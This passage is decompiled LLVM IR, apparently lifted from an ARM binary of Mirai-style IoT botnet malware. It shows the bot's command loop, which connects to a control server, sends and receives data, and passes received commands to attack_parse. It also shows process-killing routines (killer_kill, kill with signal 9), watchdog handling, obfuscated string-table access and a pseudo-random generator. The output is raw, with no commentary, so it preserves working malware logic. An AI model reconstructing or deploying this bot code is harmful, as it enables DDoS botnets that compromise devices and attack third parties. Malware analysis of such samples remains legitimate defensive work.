  %v2_de5c = call i32 @__libc_fcntl(i32 %v0_de58, i32 4)
  %v2_de64 = load i32, i32* @global_var_21aa0.84, align 4
  store i32 %v2_de64, i32* %r3.global-to-local, align 4
  %v2_de68 = icmp eq i32 %v2_de64, 0
  br i1 %v2_de68, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_de44
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_de44, %bb42
  %v2_de70 = xor i1 %v2_de68, true
  call void @__pseudo_cond_branch(i1 %v2_de70, i32 ptrtoint (i32* @global_var_1061c.113 to i32))
  store i32 ptrtoint (i8** @global_var_21c1c.110 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_de7c = load i32, i32* @global_var_21a9c.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_21c1c.110 to i8*), align 4
  %v4_de8c = call i32 @__libc_connect(i32 %v2_de7c, i32 ptrtoint (i16** @global_var_24738.93 to i32), i32 16)
  br label %dec_label_pc_dc0c

dec_label_pc_de94:                                ; preds = %dec_label_pc_dc94
  %v2_de98 = load i32, i32* @global_var_21a9c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_dea8 = call i32 @__libc_send(i32 %v2_de98, i32 %v2_de9c, i32 2, i32 16384)
  br label %dec_label_pc_dcc8

dec_label_pc_deb0:                                ; preds = %dec_label_pc_dd0c
  store i32 4, i32* @r4, align 4
  store i32 %v2_deb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_de94, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_ded4 = call i32 @getsockopt(i32 %v2_dd8c, i32 1, i32 4, i32 %v2_deb8, i32 %v2_de94)
  %v3_ded8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ded8, i32* %r3.global-to-local, align 4
  %v2_dedc = icmp eq i32 %v3_ded8, 0
  br i1 %v2_dedc, label %dec_label_pc_df64, label %dec_label_pc_dee4

dec_label_pc_dee4:                                ; preds = %dec_label_pc_deb0
  %v2_dee4 = load i32, i32* @global_var_21a9c.107, align 4
  %v1_dee8 = call i32 @__GI___libc_close(i32 %v2_dee4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_def0 = load i32, i32* @r5, align 4
  %v2_def0 = inttoptr i32 %v1_def0 to i32*
  store i32 -1, i32* %v2_def0, align 4
  %v0_def4 = call i32 @rand_next()
  %v3_defc = zext i32 %v0_def4 to i64
  %v4_defc = mul nuw i64 %v3_defc, 3435973837
  %v7_defc = trunc i64 %v4_defc to i32
  store i32 %v7_defc, i32* %ip.global-to-local, align 4
  %v3_df002 = udiv i64 %v4_defc, 34359738368
  %v3_df044 = mul nuw nsw i64 %v3_df002, 8
  %v3_df04 = trunc i64 %v3_df044 to i32
  store i32 %v3_df04, i32* %r2.global-to-local, align 4
  %v2_df086 = mul nuw nsw i64 %v3_df002, 2
  %v2_df08 = trunc i64 %v2_df086 to i32
  %v2_df0c = add i32 %v3_df04, %v2_df08
  store i32 %v2_df0c, i32* %r3.global-to-local, align 4
  %v2_df10 = sub i32 %v0_def4, %v2_df0c
  %v1_df14 = add i32 %v2_df10, 1
  %v1_df18 = call i32 @sleep(i32 %v1_df14)
  br label %dec_label_pc_db8c

dec_label_pc_df20:                                ; preds = %dec_label_pc_dcd8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_deb8, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_df34 = call i32 @__libc_accept(i32 %v2_dccc, i32 %v2_df2c, i32 %v2_deb8, i32 16, i32 16)
  %v1_df38 = call i32 @killer_kill(i32 %v5_df34)
  %v2_df48 = call i32 @kill(i32 %v1_df44, i32 9)
  store i32 ptrtoint (i32* @global_var_21c18.97 to i32), i32* %r3.global-to-local, align 4
  %v2_df50 = load i32, i32* @global_var_21c18.97, align 4
  %v2_df54 = icmp eq i32 %v2_df50, 0
  br i1 %v2_df54, label %dec_label_pc_df5c, label %dec_label_pc_dffc

dec_label_pc_df5c:                                ; preds = %dec_label_pc_df20, %dec_label_pc_dffc
  %v1_df60 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_df64

dec_label_pc_df64:                                ; preds = %dec_label_pc_deb0, %dec_label_pc_df5c
  %v2_df68 = call i32 @util_strlen(i8* %v1_df68)
  %sext = mul i32 %v2_df68, 16777216
  %v1_df6c = sdiv i32 %sext, 16777216
  %v7_df6c = inttoptr i32 %v1_df6c to i8*
  store i8* %v7_df6c, i8** %stack_var_-42, align 4
  %v0_df70 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* @lr, align 4
  %v0_df78 = load i32, i32* @r4, align 4
  store i32 %v0_df78, i32* %r2.global-to-local, align 4
  store i32 %v0_df70, i32* @global_var_2472c.58, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_df88 = load i32, i32* @r5, align 4
  %v1_df88 = inttoptr i32 %v0_df88 to i32*
  %v2_df88 = load i32, i32* %v1_df88, align 4
  %v4_df8c = call i32 @__libc_send(i32 %v2_df88, i32 ptrtoint (i32* @global_var_19290.117 to i32), i32 %v0_df78, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_df98 = load i32, i32* @r5, align 4
  %v1_df98 = inttoptr i32 %v0_df98 to i32*
  %v2_df98 = load i32, i32* %v1_df98, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_dfa4 = call i32 @__libc_send(i32 %v2_df98, i32 %v2_de9c, i32 1, i32 16384)
  %v3_dfa8 = load i8*, i8** %stack_var_-42, align 4
  %v4_dfa8 = ptrtoint i8* %v3_dfa8 to i32
  store i32 %v4_dfa8, i32* %r2.global-to-local, align 4
  %v3_dfac = icmp eq i8* %v3_dfa8, null
  br i1 %v3_dfac, label %dec_label_pc_db8c, label %dec_label_pc_dfb4

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_df64
  %v0_dfb4 = load i32, i32* @r5, align 4
  %v1_dfb4 = inttoptr i32 %v0_dfb4 to i32*
  %v2_dfb4 = load i32, i32* %v1_dfb4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_dfc0 = call i32 @__libc_send(i32 %v2_dfb4, i32 %v2_d9c8, i32 %v4_dfa8, i32 16384)
  br label %dec_label_pc_db8c

dec_label_pc_dfc8:                                ; preds = %dec_label_pc_e038, %dec_label_pc_ddc0
  %v0_dfc8 = load i32, i32* @r5, align 4
  %v1_dfc8 = inttoptr i32 %v0_dfc8 to i32*
  %v2_dfc8 = load i32, i32* %v1_dfc8, align 4
  store i32 %v2_dfc8, i32* %r3.global-to-local, align 4
  %v7_dfcc = icmp eq i32 %v2_dfc8, 4
  br i1 %v7_dfcc, label %dec_label_pc_db8c, label %bb44

bb44:                                             ; preds = %dec_label_pc_dfc8
  %v8_dfd0 = icmp eq i32 %v2_dfc8, 11
  br i1 %v8_dfd0, label %dec_label_pc_db8c, label %dec_label_pc_dfd8

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_e05c, %bb44, %dec_label_pc_ddf4
  %v2_dfd8 = load i32, i32* @global_var_21a9c.107, align 4
  store i32 57316, i32* @lr, align 4
  %v1_dfe0 = icmp ne i32 %v2_dfd8, -1
  call void @__pseudo_cond_branch(i1 %v1_dfe0, i32 ptrtoint (i32* @global_var_14260.112 to i32))
  store i32 ptrtoint (i32* @global_var_21a9c.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21a9c.107, align 4
  %v1_dff4 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db8c

dec_label_pc_dffc:                                ; preds = %dec_label_pc_df20
  %v2_e000 = call i32 @kill(i32 %v2_df50, i32 9)
  br label %dec_label_pc_df5c

dec_label_pc_e008:                                ; preds = %dec_label_pc_ddfc
  %v3_e008 = udiv i32 %v4_de00, 256
  %v1_e00c = urem i32 %v4_de00, 256
  store i32 %v1_e00c, i32* %r3.global-to-local, align 4
  %v4_e010 = mul nuw nsw i32 %v1_e00c, 256
  %v5_e010 = or i32 %v4_e010, %v3_e008
  %v6_e010 = trunc i32 %v5_e010 to i16
  store i32 %v5_e010, i32* %r2.global-to-local, align 4
  store i32 %v2_dcb8, i32* @lr, align 4
  %v7_e01c = inttoptr i32 %v5_e010 to i8*
  store i8* %v7_e01c, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e010, 1025
  br i1 %tmp45, label %dec_label_pc_e038, label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_e008
  %v2_e024 = load i32, i32* @global_var_21a9c.107, align 4
  %v1_e028 = call i32 @__GI___libc_close(i32 %v2_e024)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e030 = load i32, i32* @r8, align 4
  %v2_e030 = inttoptr i32 %v1_e030 to i32*
  store i32 -1, i32* %v2_e030, align 4
  br label %dec_label_pc_db8c

dec_label_pc_e038:                                ; preds = %dec_label_pc_e008
  %v0_e038 = load i32, i32* @r4, align 4
  %v1_e038 = load i32, i32* @r5, align 4
  %v2_e038 = inttoptr i32 %v1_e038 to i32*
  store i32 %v0_e038, i32* %v2_e038, align 4
  store i32 %v2_e040, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e048 = load i32, i32* @global_var_21a9c.107, align 4
  %v7_e050 = call i32 @__libc_recv(i32 %v2_e048, i32 %v2_e040, i32 %v5_e010, i32 16386)
  %v7_e054 = icmp eq i32 %v7_e050, -1
  br i1 %v7_e054, label %dec_label_pc_dfc8, label %dec_label_pc_e05c

dec_label_pc_e05c:                                ; preds = %dec_label_pc_e038
  %v2_e05c = icmp eq i32 %v7_e050, 0
  br i1 %v2_e05c, label %dec_label_pc_dfd8, label %dec_label_pc_e064

dec_label_pc_e064:                                ; preds = %dec_label_pc_e05c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e070 = load i32, i32* @global_var_21a9c.107, align 4
  %v4_e074 = call i32 @__libc_recv(i32 %v2_e070, i32 %v2_de9c, i32 2, i32 16384)
  %v3_e07c = load i8*, i8** %stack_var_-42, align 4
  %v4_e07c = ptrtoint i8* %v3_e07c to i32
  %v3_e080 = udiv i32 %v4_e07c, 256
  %v1_e084 = mul i32 %v4_e07c, 256
  %v4_e088 = and i32 %v1_e084, 65280
  %v5_e088 = or i32 %v4_e088, %v3_e080
  store i32 %v5_e088, i32* %ip.global-to-local, align 4
  store i32 %v2_dcb8, i32* @lr, align 4
  store i32 %v5_e088, i32* %r2.global-to-local, align 4
  %v2_e098 = load i32, i32* @global_var_21a9c.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e0a0 = inttoptr i32 %v5_e088 to i8*
  store i8* %v6_e0a0, i8** %stack_var_-42, align 4
  %v6_e0a4 = call i32 @__libc_recv(i32 %v2_e098, i32 %v2_e040, i32 %v5_e088, i32 16384)
  store i32 %v2_dcb8, i32* %r2.global-to-local, align 4
  %v3_e0ac = load i8*, i8** %stack_var_-42, align 4
  %v3_e0b0 = icmp eq i8* %v3_e0ac, null
  br i1 %v3_e0b0, label %dec_label_pc_db8c, label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %dec_label_pc_e064
  %v4_e0ac = ptrtoint i8* %v3_e0ac to i32
  %v5_e0bc = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e0ac, i32 %v2_dcb8)
  br label %dec_label_pc_db8c

; uselistorder directives
  uselistorder i8* %v3_e0ac, { 1, 0 }
  uselistorder i32 %v5_e088, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e050, { 1, 0 }
  uselistorder i32 %v5_e010, { 1, 0, 3, 2 }
  uselistorder i32 %v3_de30, { 1, 3, 2, 0 }
  uselistorder i32 %v4_de00, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dde8, { 1, 0 }
  uselistorder i32 %v2_dd8c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_dccc, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_dcb4, { 1, 0, 2 }
  uselistorder i32 %v5_dc80, { 1, 2, 0 }
  uselistorder i32 %v2_dbcc, { 2, 1, 0 }
  uselistorder i32 %v1_dbbc, { 1, 2, 0 }
  uselistorder i32 %v1_dba0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_deb8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_de9c, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_de94, { 1, 0 }
  uselistorder i32 %v2_dcb8, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_db88, { 1, 0, 2 }
  uselistorder i32 %v2_da2c, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_da18, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_21c18.97, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @kill, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21c1c.110 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21c1c.110 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_21a98.86, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_21a9c.107, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21aa0.84, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d7fc.82 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24738.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_df64, { 1, 0 }
  uselistorder label %dec_label_pc_df5c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dcc8, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_dc0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbfc, { 1, 0 }
  uselistorder label %dec_label_pc_db8c, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d9ec, { 2, 0, 1 }
}

define i32 @function_e0ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e0ec:
  %v0_e0ec = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e0ec, i32 -22312032)
  %v0_e0f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e0ec
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e0ec, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e108 = load i32, i32* @global_var_21c20.119, align 4
  %v2_e10c = load i32, i32* @global_var_21c2c.121, align 4
  %v4_e118 = mul i32 %v2_e108, 2048
  %v5_e118 = xor i32 %v4_e118, %v2_e108
  store i32 %v5_e118, i32* @r3, align 4
  %v4_e11c = udiv i32 %v2_e10c, 524288
  %v5_e11c = xor i32 %v4_e11c, %v2_e10c
  %v2_e120 = load i32, i32* @global_var_21c24.123, align 4
  %v2_e124 = load i32, i32* @global_var_21c28.125, align 4
  %v2_e128 = xor i32 %v5_e11c, %v5_e118
  %v4_e12c = udiv i32 %v5_e118, 256
  %v5_e12c = xor i32 %v2_e128, %v4_e12c
  store i32 %v2_e120, i32* @global_var_21c20.119, align 4
  store i32 %v2_e124, i32* @global_var_21c24.123, align 4
  store i32 %v2_e10c, i32* @global_var_21c28.125, align 4
  store i32 %v5_e12c, i32* @global_var_21c2c.121, align 4
  ret i32 %v5_e12c

; uselistorder directives
  uselistorder i32 %v2_e10c, { 2, 1, 0 }
  uselistorder i32 %v2_e108, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e164 = call i32 @__GI_time(i32* null)
  store i32 %v2_e164, i32* @global_var_21c20.119, align 4
  %v1_e170 = call i32 @__getpid(i32 %v2_e164)
  store i32 %v1_e170, i32* @r0, align 4
  %v0_e178 = call i32 @getppid()
  %v2_e180 = xor i32 %v1_e170, %v0_e178
  store i32 %v2_e180, i32* @global_var_21c24.123, align 4
  %v1_e188 = call i32 @clock(i32 %v2_e180)
  %v2_e18c = load i32, i32* @global_var_21c24.123, align 4
  %v2_e198 = xor i32 %v2_e18c, %v1_e188
  store i32 %v2_e198, i32* @global_var_21c2c.121, align 4
  store i32 %v1_e188, i32* @global_var_21c28.125, align 4
  ret i32 %v1_e188

; uselistorder directives
  uselistorder i32 %v1_e188, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e1c0 = load i32, i32* @r4, align 4
  %v6_e1c0 = load i32, i32* @r5, align 4
  %v9_e1c0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e1d4 = call i32 @table_unlock_val(i32 31)
  %v3_e1e0 = call i32 @table_retrieve_val(i32 31, i32* null)
  store i32 %v3_e1e0, i32* @r1, align 4
  %v2_e1ec = bitcast i32* %stack_var_-72 to i8*
  %v3_e1ec = call i32 @strcpy(i8* %v2_e1ec, i32 %v3_e1e0)
  %v2_e1f0 = icmp eq i32 %arg2, 0
  br i1 %v2_e1f0, label %dec_label_pc_e26c, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21c20.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c24.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c28.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c2c.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e250 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e20c

dec_label_pc_e20c:                                ; preds = %dec_label_pc_e20c.dec_label_pc_e20c_crit_edge, %dec_label_pc_e1f8
  %v1_e230 = phi i32 [ %v1_e230.pre, %dec_label_pc_e20c.dec_label_pc_e20c_crit_edge ], [ ptrtoint (i32* @global_var_21c20.119 to i32), %dec_label_pc_e1f8 ]
  %v2_e20c = load i32, i32* @global_var_21c2c.121, align 4
  store i32 %v2_e20c, i32* %r2.global-to-local, align 4
  %v2_e210 = load i32, i32* @global_var_21c20.119, align 4
  %v4_e214 = udiv i32 %v2_e20c, 524288
  %v5_e214 = xor i32 %v4_e214, %v2_e20c
  %v4_e218 = mul i32 %v2_e210, 2048
  %v5_e218 = xor i32 %v4_e218, %v2_e210
  %v2_e21c = xor i32 %v5_e214, %v5_e218
  %v2_e220 = load i32, i32* @global_var_21c24.123, align 4
  %v2_e224 = load i32, i32* @global_var_21c28.125, align 4
  store i32 %v2_e224, i32* %ip.global-to-local, align 4
  %v4_e228 = udiv i32 %v5_e218, 256
  %v5_e228 = xor i32 %v2_e21c, %v4_e228
  store i32 %v5_e228, i32* @r4, align 4
  %v2_e230 = inttoptr i32 %v1_e230 to i32*
  store i32 %v2_e220, i32* %v2_e230, align 4
  %v0_e234 = load i32, i32* %ip.global-to-local, align 4
  %v1_e234 = load i32, i32* %r8.global-to-local, align 4
  %v2_e234 = inttoptr i32 %v1_e234 to i32*
  store i32 %v0_e234, i32* %v2_e234, align 4
  %v0_e238 = load i32, i32* %r2.global-to-local, align 4
  %v1_e238 = load i32, i32* %r7.global-to-local, align 4
  %v2_e238 = inttoptr i32 %v1_e238 to i32*
  store i32 %v0_e238, i32* %v2_e238, align 4
  %v0_e23c = load i32, i32* @r4, align 4
  %v1_e23c = load i32, i32* @r6, align 4
  %v2_e23c = inttoptr i32 %v1_e23c to i32*
  store i32 %v0_e23c, i32* %v2_e23c, align 4
  %v2_e240 = call i32 @util_strlen(i8* %v2_e1ec)
  %v0_e248 = load i32, i32* @r4, align 4
  %v3_e24c = urem i32 %v0_e248, %v2_e240
  %v2_e254 = add i32 %v3_e24c, %v2_e250
  %v1_e258 = add i32 %v2_e254, -32
  %v2_e258 = inttoptr i32 %v1_e258 to i8*
  %v3_e258 = load i8, i8* %v2_e258, align 1
  %v2_e25c = load i32, i32* @r5, align 4
  %v3_e25c = load i32, i32* %fp.global-to-local, align 4
  %v4_e25c = add i32 %v3_e25c, %v2_e25c
  %v5_e25c = inttoptr i32 %v4_e25c to i8*
  store i8 %v3_e258, i8* %v5_e25c, align 1
  %v0_e260 = load i32, i32* @r5, align 4
  %v1_e260 = add i32 %v0_e260, 1
  store i32 %v1_e260, i32* @r5, align 4
  %v1_e264 = load i32, i32* %sb.global-to-local, align 4
  %v9_e264 = icmp eq i32 %v1_e260, %v1_e264
  br i1 %v9_e264, label %dec_label_pc_e26c, label %dec_label_pc_e20c.dec_label_pc_e20c_crit_edge

dec_label_pc_e20c.dec_label_pc_e20c_crit_edge:    ; preds = %dec_label_pc_e20c
  %v1_e230.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e20c

dec_label_pc_e26c:                                ; preds = %dec_label_pc_e20c, %entry
  %v1_e270 = call i32 @table_lock_val(i32 31)
  store i32 %v3_e1c0, i32* @r4, align 4
  store i32 %v6_e1c0, i32* @r5, align 4
  store i32 %v9_e1c0, i32* @r6, align 4
  ret i32 %v1_e270

; uselistorder directives
  uselistorder i32 %v2_e210, { 1, 0 }
  uselistorder i32 %v2_e20c, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e290 = load i32, i32* %r1.global-to-local, align 4
  %v3_e294 = load i32, i32* @r4, align 4
  store i32 %v3_e294, i32* %stack_var_-28, align 4
  %v0_e298 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e298, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e290, 1
  br i1 %tmp16, label %dec_label_pc_e340, label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21c2c.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c28.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c24.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c20.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e2b0 = load i32, i32* @global_var_21c2c.121, align 4
  store i32 %v2_e2b0, i32* %lr.global-to-local, align 4
  %v2_e2b4 = load i32, i32* @global_var_21c28.125, align 4
  store i32 %v2_e2b4, i32* %r4.global-to-local, align 4
  %v2_e2b8 = load i32, i32* @global_var_21c24.123, align 4
  store i32 %v2_e2b8, i32* %r0.global-to-local, align 4
  %v2_e2bc = load i32, i32* @global_var_21c20.119, align 4
  br label %dec_label_pc_e2e0

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e300
  %v1_e2c4 = trunc i32 %v5_e2f0 to i16
  %v3_e2c4 = inttoptr i32 %v9_e2f4 to i16*
  store i16 %v1_e2c4, i16* %v3_e2c4, align 2
  %v4_e2c4 = load i32, i32* %r5.global-to-local, align 4
  %v5_e2c4 = add i32 %v4_e2c4, -2
  store i32 %v5_e2c4, i32* %r5.global-to-local, align 4
  %v0_e2c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2c8

dec_label_pc_e2c8:                                ; preds = %.thread, %dec_label_pc_e2c4
  %v0_e2c8 = phi i32 [ %v9_e2f8, %.thread ], [ %v0_e2c8.pre, %dec_label_pc_e2c4 ]
  %v2_e2c45 = phi i32 [ %v12_e2f4, %.thread ], [ %v5_e2c4, %dec_label_pc_e2c4 ]
  %tmp17 = icmp slt i32 %v0_e2c8, 1
  br i1 %tmp17, label %dec_label_pc_e348, label %dec_label_pc_e2d4

dec_label_pc_e2d4:                                ; preds = %dec_label_pc_e2c8
  %v0_e2cc = load i32, i32* %r0.global-to-local, align 4
  %v0_e2d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2d4, i32* %r0.global-to-local, align 4
  %v0_e2d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e2d8, i32* %r4.global-to-local, align 4
  %v0_e2dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e2dc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e2e0

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e2a0, %dec_label_pc_e2d4
  %v0_e32c = phi i32 [ %v2_e2b8, %dec_label_pc_e2a0 ], [ %v0_e2d4, %dec_label_pc_e2d4 ]
  %v9_e2f4 = phi i32 [ %v0_e298, %dec_label_pc_e2a0 ], [ %v2_e2c45, %dec_label_pc_e2d4 ]
  %v0_e30c = phi i32 [ %v0_e290, %dec_label_pc_e2a0 ], [ %v0_e2c8, %dec_label_pc_e2d4 ]
  %v0_e320 = phi i32 [ %v2_e2b0, %dec_label_pc_e2a0 ], [ %v0_e2dc, %dec_label_pc_e2d4 ]
  %v0_e31c = phi i32 [ %v2_e2bc, %dec_label_pc_e2a0 ], [ %v0_e2cc, %dec_label_pc_e2d4 ]
  %v4_e2e0 = mul i32 %v0_e31c, 2048
  %v5_e2e0 = xor i32 %v4_e2e0, %v0_e31c
  %v4_e2e4 = udiv i32 %v0_e320, 524288
  %v5_e2e4 = xor i32 %v4_e2e4, %v0_e320
  %v2_e2e8 = xor i32 %v5_e2e4, %v5_e2e0
  %v4_e2f0 = udiv i32 %v5_e2e0, 256
  %v5_e2f0 = xor i32 %v2_e2e8, %v4_e2f0
  store i32 %v5_e2f0, i32* %r3.global-to-local, align 4
  %v7_e2f4 = icmp sgt i32 %v0_e30c, 3
  br i1 %v7_e2f4, label %.thread, label %dec_label_pc_e300

.thread:                                          ; preds = %dec_label_pc_e2e0
  %v10_e2f4 = inttoptr i32 %v9_e2f4 to i32*
  store i32 %v5_e2f0, i32* %v10_e2f4, align 4
  %v11_e2f4 = load i32, i32* %r5.global-to-local, align 4
  %v12_e2f4 = add i32 %v11_e2f4, 4
  store i32 %v12_e2f4, i32* %r5.global-to-local, align 4
  %v8_e2f8 = load i32, i32* %r1.global-to-local, align 4
  %v9_e2f8 = add i32 %v8_e2f8, -4
  store i32 %v9_e2f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2c8

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2e0
  %v7_e30c = icmp eq i32 %v0_e30c, 1
  store i32 %v5_e2f0, i32* %r3.global-to-local, align 4
  %v1_e314 = add i32 %v0_e30c, -2
  store i32 %v1_e314, i32* %r1.global-to-local, align 4
